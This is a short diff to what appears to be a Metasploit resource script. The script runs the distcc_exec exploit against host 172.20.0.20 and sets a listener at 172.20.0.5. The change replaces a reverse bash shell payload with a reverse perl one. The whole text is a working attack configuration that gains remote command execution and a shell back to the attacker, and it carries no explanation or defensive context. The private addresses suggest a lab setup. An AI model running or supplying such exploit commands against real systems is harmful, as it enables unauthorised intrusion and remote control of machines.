@@ -8,5 +8,5 @@
 use exploit/unix/misc/distcc_exec
 set RHOSTS 172.20.0.20
 set LHOST 172.20.0.5
-set PAYLOAD cmd/unix/reverse_bash
+set PAYLOAD cmd/unix/reverse_perl
 exploit
